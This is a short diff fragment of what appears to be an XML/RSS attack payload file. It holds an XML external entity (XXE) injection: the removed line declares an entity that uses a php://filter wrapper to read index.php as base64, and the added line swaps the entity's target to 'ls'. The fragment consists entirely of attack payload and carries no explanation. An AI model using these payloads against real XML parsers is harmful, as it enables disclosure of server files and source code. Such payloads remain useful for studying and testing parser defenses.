@@ -3,7 +3,7 @@
  
  <!DOCTYPE foo [  
    <!ELEMENT foo ANY >
-<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php" >]><foo>&xxe;</foo>
+<!ENTITY xxe SYSTEM "ls" >]><foo>&xxe;</foo>
 
 <rss version="2.0">
     <channel>
